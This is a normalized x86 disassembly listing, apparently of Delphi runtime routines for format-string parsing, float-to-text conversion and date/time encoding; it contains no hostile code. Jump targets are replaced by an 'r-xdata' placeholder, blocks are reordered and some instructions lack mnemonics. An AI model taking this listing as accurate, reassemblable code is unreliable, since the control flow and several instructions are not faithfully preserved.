retn
sub_412c44
push ebp
mov ebp esp
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4130a8
pop ebx
pop ebp
retn 0xc
sub_412c60
push ebp
mov ebp esp
add esp 0xffffff58
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
shr eax 0x1
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_413024
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsw [ esi ]
cmp ax 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosw [ edi ]
dec edx
jne r-xdata
lodsw [ esi ]
cmp ax 0x25
je r-xdata
lea ebx [ esi - 0x4 ]
mov [ ebp - 0x14 ] ebx
call sub_412d4e
cmp ax 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x1c ] ebx
mov ebx 0xffffffff
cmp ax 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsw [ esi ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] esi
push ecx
push edx
call sub_412d9d
pop edx
mov ebx [ ebp - 0x1c ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsw [ esi ]
jmp r-xdata
cmp [ ebp - 0x16 ] 0x2d
jne r-xdata
xor ebx ebx
lodsw [ esi ]
call sub_412d4e
mov [ ebp - 0x16 ] ax
cmp ax 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov ax 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
pop ecx
mov esi [ ebp - 0x24 ]
jmp r-xdata
add ecx edx
xor edx edx
or edx edx
je r-xdata
sub_412d4e
xor ebx ebx
cmp ax 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp ax 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp ax 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsw [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub ax 0x30
movzx eax ax
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
shr eax 0x1
jmp r-xdata
lodsw [ esi ]
jmp r-xdata
call sub_413024
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_412d9d
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_413024
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x24 ]
sub ecx edx
shr ecx 0x1
mov ebx [ ebp - 0x4 ]
call sub_412ba0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_412dc4 ]
mov ebx ecx
sub cl 0x44
je r-xdata
xor edx edx
xor eax eax
lea esi [ ebp - 0x66 ]
mov edx [ ebp - 0x20 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x86 ]
mov edx [ ebp - 0x20 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_406e88
jmp r-xdata
mov esi sub_406ef4
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
or cl cl
jne sub_4119a8
mov ecx 0x10
cmp bl 0x58
je r-xdata
sub cl 0x44
je r-xdata
xor edx edx
mov eax esi
mov ecx 0x1
jmp r-xdata
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
movzx ecx [ eax ]
inc eax
cmp cl 0x53
jne r-xdata
add esi [ ebp - 0x4 ]
mov edx eax
lea eax [ ebp - 0x10 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov esi eax
or esi esi
je r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor eax eax
mov ecx [ ebp - 0x20 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x86 ]
jmp r-xdata
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4119a8
mov ecx 0xa
cmp bl 0x55
je r-xdata
or cl cl
jne r-xdata
mov ecx 0x10
cmp bl 0x58
je r-xdata
mov esi sub_406e54
jmp r-xdata
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_412c20
mov esi [ ebp - 0x10 ]
jmp r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
jmp r-xdata
mov ecx [ esi - 0x4 ]
shr ecx 0x1
mov ecx edi
sub ecx esi
shr ecx 0x1
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0xa6 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_412c44
mov ecx eax
lea edx [ ebp - 0xa6 ]
lea eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
call sub_406e64
mov esi [ ebp - 0x10 ]
or esi esi
je r-xdata
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4119a8
inc ecx
mov [ esi - 0x2 ] 0x2d
sub esi 0x2
add esp 0x8
retn
jmp r-xdata
push edx
push esi
or eax eax
jns sub_4118d0
mov ecx 0xa
cmp bl 0x55
je r-xdata
cmp ecx [ ebp - 0x20 ]
ja r-xdata
mov ecx [ ebp - 0x20 ]
retn
retn
dec edi
dec edi
mov ecx [ esi - 0x4 ]
shr ecx 0x1
retn
mov eax 0x12
mov edx [ ebp - 0x20 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
mov [ esi ] dx
or eax eax
jne r-xdata
add dx 0x7
neg eax
call sub_4118d0
mov ax 0x2d
mov [ esi - 0x2 ] ax
sub esi 0x2
inc ecx
retn
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
xor edx edx
div ecx
add dx 0x30
sub esi 0x2
cmp dx 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
shr ecx 0x1
sub edx ecx
jbe r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
retn
add ecx edx
sub esi edx
mov ax 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_413044
push esi
xor esi esi
stosb [ edi ]
cmp bh 0x0
je r-xdata
or bl bl
jne r-xdata
xor al al
stosb [ edi ]
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
push ebx
mov ebx esp
sub ebx 0x8
push ebx
mov al ah
stosb [ edi ]
cmp bh 0x0
je r-xdata
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
xor al al
stosb [ edi ]
pop edx
pop ecx
cmp ebx edx
jne r-xdata
xor al al
stosb [ edi ]
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ch 0x0
je r-xdata
pop eax
pop esi
retn
sub_4130a8
push ebp
mov ebp esp
add esp 0xffffffd8
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xa ] ax
mov ax [ rw-data ]
mov [ ebp - 0xc ] ax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x26 ]
call sub_4133a8
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x26 ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x23 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4131a8
shl ecx 0x1
lea esi [ ecx + ecx * 2 + r-xdata ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
mov ebx [ ebx ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
shr eax 0x1
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x26 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4131b5
call sub_4131a8
movsx ecx [ ebp - 0x26 ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov ax 0x30
[ edi ]
xor ah ah
stosw [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov ax 0x30
stosw [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
xor ah ah
shl eax 0x10
mov ax [ ebp - 0xa ]
stosd [ edi ]
mov ax [ ebp - 0xa ]
stosw [ edi ]
neg ecx
mov ax 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x23 ]
mov bh 0x1
movsx edx [ ebp - 0x26 ]
dec edx
call sub_413044
retn
xor ecx ecx
xor ah ah
stosw [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_413225
call sub_4131a8
call sub_41319d
stosw [ edi ]
mov ax [ ebp - 0xa ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_41319d
stosw [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x23 ]
mov bh 0x1
movsx edx [ ebp - 0x26 ]
dec edx
call sub_413044
retn
xor ecx ecx
sub_413267
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x26 ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov ax 0x30
stosw [ edi ]
jmp r-xdata
call sub_41319d
stosw [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov ax [ ebp - 0xa ]
test ax ax
je r-xdata
mov ax [ ebp - 0xc ]
test ax ax
je r-xdata
jecxz r-xdata
stosw [ edi ]
stosw [ edi ]
mov bl 0x3
jmp r-xdata
call sub_41319d
stosw [ edi ]
dec edx
jne r-xdata
mov ax 0x30
inc ecx
jne r-xdata
stosw [ edi ]
dec edx
je r-xdata
sub_4132da
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_41332e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_413267
xor ah ah
stosw [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4133a8
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4133d5
jmp r-xdata
call sub_4134f7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4133d5
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_4051c0
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4134f7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4135d4
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_41368b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_413696
neg edx
mov ecx esi
call sub_413696
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_41368b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4136b2
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_4051c0
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_413696
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4136b2
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4136e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41373c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
mov ecx 0x0
call sub_406b48
mov eax [ ebp - 0x4 ]
call sub_406c0c
mov edx esi
mov ecx ebx
call sub_4135d4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413743
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_41374c
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x80 ]
xor ecx ecx
call sub_4130a8
mov ecx eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_4071e4
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41377c
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x80 ]
mov cl 0x1
call sub_4130a8
mov ecx eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_4071e4
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4137c8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_407134
mov edx esp
xor ecx ecx
call sub_4136e8
mov edx eax
test dl dl
je r-xdata
test dl dl
je r-xdata
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
ja r-xdata
mov eax edx
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
xor edx edx
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
sub_413838
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_407134
mov edx esp
xor ecx ecx
call sub_4136e8
mov edx eax
test dl dl
je r-xdata
test dl dl
je r-xdata
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
ja r-xdata
mov eax edx
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
xor edx edx
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
sub_4138c4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_413908
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_413978
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4138c4
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_410c28
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_410c28
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_410c28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4139d4
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_413a10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
movzx eax [ ebp - 0x2 ]
call sub_4139d4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
movzx eax [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_413adc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x24 ]
call sub_4138c4
mov ecx [ ebp - 0x20 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0x1a ]
push eax
lea eax [ ebp - 0x1c ]
mov dx 0x8eac
xchg ecx eax
call sub_410c28
cmp [ ebp - 0x1c ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x1c ] 0x64
add bx ax
lea eax [ ebp - 0x1a ]
push eax
lea ecx [ ebp - 0x1c ]
movzx eax [ ebp - 0x1a ]
mov dx 0x5b5
call sub_410c28
movzx eax [ ebp - 0x1c ]
add eax eax
add eax eax
add bx ax
lea eax [ ebp - 0x1a ]
push eax
lea ecx [ ebp - 0x1c ]
movzx eax [ ebp - 0x1a ]
mov dx 0x16d
call sub_410c28
cmp [ ebp - 0x1c ] 0x4
jne r-xdata
dec [ ebp - 0x1c ]
add [ ebp - 0x1a ] 0x8eac
add bx [ ebp - 0x1c ]
mov eax ebx
call sub_4139d4
mov edx eax
movzx eax dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x1c ]
add [ ebp - 0x1a ] 0x16d
mov ecx [ ebp - 0x8 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x10 ]
mov [ ecx ] ax
movzx eax [ ebp - 0x1a ]
inc eax
mov ecx [ ebp - 0x18 ]
mov [ ecx ] ax
movzx ecx [ ebp - 0x1c ]
sub [ ebp - 0x1a ] cx
inc eax
jmp r-xdata
movzx ecx ax
movzx ecx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x1c ] cx
movzx ecx [ ebp - 0x1a ]
cmp cx [ ebp - 0x1c ]
jb r-xdata
sub_413c28
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_413adc
pop esi
pop ecx
pop ebp
retn 0x8
sub_413c48
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4138c4
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_413c84
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x204 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x204 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x204 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx * 2 - 0x200 ]
mov ecx ebx
add ecx ecx
call sub_4043c8
sub_413cc8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_413d30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_413c84
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d37
